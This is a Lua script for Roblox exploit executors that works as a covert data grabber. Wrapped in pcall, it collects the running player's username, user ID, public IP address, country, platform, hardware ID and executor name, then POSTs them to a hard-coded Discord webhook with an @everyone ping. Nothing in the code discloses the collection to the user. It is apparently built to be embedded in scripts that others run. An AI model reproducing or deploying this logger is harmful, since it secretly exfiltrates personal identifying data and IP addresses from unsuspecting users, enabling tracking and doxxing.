local webh = "https://discord.com/api/webhooks/1092104955940311080/rIZ1dEyywQso0tN_9RlSFeD9wRTyacSSKh0A6R2gk89iRMGNyv8sxqsb0bDhXiOSP-9G"

               function checkexploit()
	if syn then return "Synapse X"
	elseif SENTINEL_V2 then return "Sentinel"
	elseif iskrnlclosure then return "krnl"
	else return "Unrecognized"
	end
end

pcall(function()
   local player = game:GetService("Players").LocalPlayer
   local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
   local placeId = game.PlaceId
   local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
local data =
	{
		["content"] = "@everyone",
		["embeds"] = {{
			["title"] = "Streamable Executed",
			["description"] = "",
			["thumbnail"] = {
				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
			},
			["footer"] = {
				["text"] = "bxvlz#9523",
			},
			["fields"] = {
				{
					["name"] = "**Username**",
					["value"] = "```"..game.Players.LocalPlayer.Name.."```",
					["inline"] = true
				},
				{
					["name"] = "**User ID**",
					["value"] = "```"..game.Players.LocalPlayer.UserId.."```",
					["inline"] = true
				},
				{
					["name"] = "**Country**",
					["value"] = "```"..game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/"..tostring(game:HttpGet("https://api.ipify.org")).."?fields=1"))["country"].."```",
					["inline"] = true
				},
				{
					["name"] = "**Platform**",
					["value"] = "```"..string.sub(tostring(game:GetService("UserInputService"):GetPlatform()), 15).."```",
					["inline"] = true
				},
				{
					["name"] = "**Exploit**",
					["value"] = "```"..checkexploit().."```",
					["inline"] = true
				},
				{
					["name"] = "**IP Address**",
					["value"] = "```"..tostring(game:HttpGet("http://api.ipify.org")).."```",
					["inline"] = false
				},
				{
					["name"] = "**HWID**",
					["value"] = "```"..tostring(hwid).."```",
					["inline"] = false
				}
			}
		}
		}}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
